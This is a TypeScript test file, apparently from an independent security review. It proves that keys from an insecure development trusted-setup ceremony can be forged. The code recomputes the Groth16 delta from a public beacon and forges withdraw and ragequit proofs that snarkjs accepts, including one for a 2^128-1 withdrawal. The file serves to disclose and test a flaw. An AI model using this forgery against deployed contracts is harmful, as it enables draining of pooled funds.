/**
 * Independent review PoC: the INSECURE DEV CEREMONY keys are forgeable by anyone.
 *
 * `scripts/ceremony-dev.sh` (default mode) ends phase 2 with `zkey beacon <public hash> 10` on a zkey
 * whose delta is 1 (`groth16 setup`). So delta = `Fr.fromRng(rngFromBeaconParams(BEACON, 10))`, which
 * snarkjs' own `misc.js` recomputes. snarkjs fixes gamma = G2 generator. With A = alpha1, B = beta2,
 * the Groth16 check `e(A,B) = e(alpha,beta) e(vk_x,gamma) e(C,delta)` holds for
 * C = -(1/delta) * vk_x, for ANY public signals. Only vkey data + the public beacon are used.
 * The Solidity counterpart (pool drained via withdraw and ragequit) is
 * packages/pool-contracts/test/ForgedProof.t.sol.
 */
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { buildBn128 } from 'ffjavascript';
import type { Bn128 } from 'ffjavascript';
import * as snarkjs from 'snarkjs';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { HAVE_VKEY, PKG, art, loadJson } from './circuit.testutil.js';

const BEACON = '0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20';

interface VKey {
  vk_alpha_1: string[];
  vk_beta_2: string[][];
  vk_gamma_2: string[][];
  vk_delta_2: string[][];
  IC: string[][];
}

interface Ext {
  Fr: {
    fromRng(r: unknown): Uint8Array;
    inv(x: Uint8Array): Uint8Array;
    neg(x: Uint8Array): Uint8Array;
    e(x: bigint): Uint8Array;
  };
  G1: {
    fromObject(o: bigint[]): Uint8Array;
    toObject(p: Uint8Array): bigint[];
    toAffine(p: Uint8Array): Uint8Array;
    timesFr(p: Uint8Array, s: Uint8Array): Uint8Array;
    add(a: Uint8Array, b: Uint8Array): Uint8Array;
  };
  G2: {
    g: Uint8Array;
    toObject(p: Uint8Array): bigint[][];
    toAffine(p: Uint8Array): Uint8Array;
    timesFr(p: Uint8Array, s: Uint8Array): Uint8Array;
  };
}

const big = (a: string[]): bigint[] => a.map(BigInt);

async function deltaFromBeacon(c: Ext): Promise<Uint8Array> {
  // misc.js is not in snarkjs' `exports`; load it by path (hoisted workspace node_modules).
  const miscPath = pathToFileURL(join(PKG, '../../node_modules/snarkjs/src/misc.js')).href;
  const misc = (await import(miscPath)) as {
    hex2ByteArray(h: string): Uint8Array;
    rngFromBeaconParams(b: Uint8Array, n: number): Promise<unknown>;
  };
  return c.Fr.fromRng(await misc.rngFromBeaconParams(misc.hex2ByteArray(BEACON), 10));
}

function forge(c: Ext, vk: VKey, delta: Uint8Array, signals: bigint[]): snarkjs.Groth16Proof {
  let vkx = c.G1.fromObject(big(vk.IC[0] as string[]));
  signals.forEach((s, i) => {
    vkx = c.G1.add(vkx, c.G1.timesFr(c.G1.fromObject(big(vk.IC[i + 1] as string[])), c.Fr.e(s)));
  });
  const C = c.G1.toAffine(c.G1.timesFr(vkx, c.Fr.neg(c.Fr.inv(delta))));
  return {
    pi_a: vk.vk_alpha_1,
    pi_b: vk.vk_beta_2,
    pi_c: c.G1.toObject(C).map(String),
    protocol: 'groth16',
    curve: 'bn128',
  };
}

describe.skipIf(!HAVE_VKEY)('INSECURE DEV CEREMONY: proofs are forgeable from public data', () => {
  let bn: Bn128;
  let c: Ext;
  beforeAll(async () => {
    bn = await buildBn128(true);
    c = bn as unknown as Ext;
  });
  afterAll(async () => {
    await bn.terminate();
  });

  it('recomputes delta from the public beacon and forges withdraw and ragequit proofs', async () => {
    const delta = await deltaFromBeacon(c);
    for (const [path, n] of [
      [art.withdrawVkey, 9],
      [art.ragequitVkey, 4],
    ] as const) {
      const vk = loadJson<VKey>(path);
      const d2 = c.G2.toObject(c.G2.toAffine(c.G2.timesFr(c.G2.g, delta))).map((p) => p.map(String));
      expect(d2).toEqual(vk.vk_delta_2);
      const g2 = c.G2.toObject(c.G2.toAffine(c.G2.g)).map((p) => p.map(String));
      expect(g2).toEqual(vk.vk_gamma_2);
      // Arbitrary statement: e.g. withdraw 2^128-1 with an unseen nullifier hash against any root.
      const signals = Array.from({ length: n }, (_, i) => BigInt(i * 7919 + 1));
      signals[2] = (1n << 128n) - 1n;
      const proof = forge(c, vk, delta, signals);
      expect(await snarkjs.groth16.verify(vk, signals.map(String), proof)).toBe(true);
    }
  });
});
